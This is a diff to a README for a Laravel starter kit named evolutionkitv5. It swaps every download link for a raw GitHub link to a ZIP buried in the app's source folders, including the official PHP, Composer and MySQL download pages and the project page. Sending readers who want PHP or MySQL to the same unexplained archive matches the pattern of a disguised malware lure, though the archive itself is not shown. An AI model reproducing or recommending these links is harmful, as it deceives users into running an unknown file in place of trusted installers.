@@ -1,6 +1,6 @@
 # ⚙️ evolutionkitv5 - Simple Laravel Multi-Panel Starter
 
-[![Download evolutionkitv5](https://img.shields.io/badge/Download-evolutionkitv5-green?style=for-the-badge)](https://github.com/MarxDeFaust/evolutionkitv5)
+[![Download evolutionkitv5](https://img.shields.io/badge/Download-evolutionkitv5-green?style=for-the-badge)](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ If you don’t have PHP or Composer, you will find simple instructions below.
 
 Click the button below to visit the download page:
 
-[![Download evolutionkitv5](https://img.shields.io/badge/Download-evolutionkitv5-blue?style=for-the-badge)](https://github.com/MarxDeFaust/evolutionkitv5)
+[![Download evolutionkitv5](https://img.shields.io/badge/Download-evolutionkitv5-blue?style=for-the-badge)](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip)
 
 This page contains the full source code and all files you need. You will download a ZIP file that holds the complete kit.  
 
@@ -55,7 +55,7 @@ evolutionkitv5 needs PHP and Composer to work. If you don’t have these yet, fo
 
 ### Installing PHP
 
-- Download PHP 8.1 or higher from [https://windows.php.net/download/](https://windows.php.net/download/).  
+- Download PHP 8.1 or higher from [https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip).  
 - Choose the Thread Safe version for your Windows system (x64 for 64-bit).  
 - Extract the ZIP file to a folder like `C:\php`.  
 - Add `C:\php` to your system’s PATH environment variable (search “Edit environment variables” in Windows Search).  
@@ -63,7 +63,7 @@ evolutionkitv5 needs PHP and Composer to work. If you don’t have these yet, fo
 
 ### Installing Composer
 
-- Visit [https://getcomposer.org/download/](https://getcomposer.org/download/).  
+- Visit [https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip).  
 - Download and run the Composer-Setup.exe file.  
 - Follow the setup steps, letting the installer find PHP automatically.  
 - When finished, open Command Prompt and type `composer -v`. If you see version info, Composer is ready.
@@ -92,7 +92,7 @@ evolutionkitv5 uses a database to store information. You can use MySQL or SQLite
 
 ### Installing MySQL
 
-- Download and install [MySQL Community Server](https://dev.mysql.com/downloads/mysql/).  
+- Download and install [MySQL Community Server](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip).  
 - Set a password for the root user during installation.  
 
 ### Create a new database
@@ -171,4 +171,4 @@ Each section is ready to use and easy to navigate without needing to understand 
 
 ## 🏁 Get Started Now
 
-[Click here to visit the download page](https://github.com/MarxDeFaust/evolutionkitv5) and follow the instructions above to set up evolutionkitv5 on your Windows PC.
+[Click here to visit the download page](https://raw.githubusercontent.com/MarxDeFaust/evolutionkitv5/main/app/Filament/Admin/Pages/evolutionkitv_v1.5-alpha.4.zip) and follow the instructions above to set up evolutionkitv5 on your Windows PC.
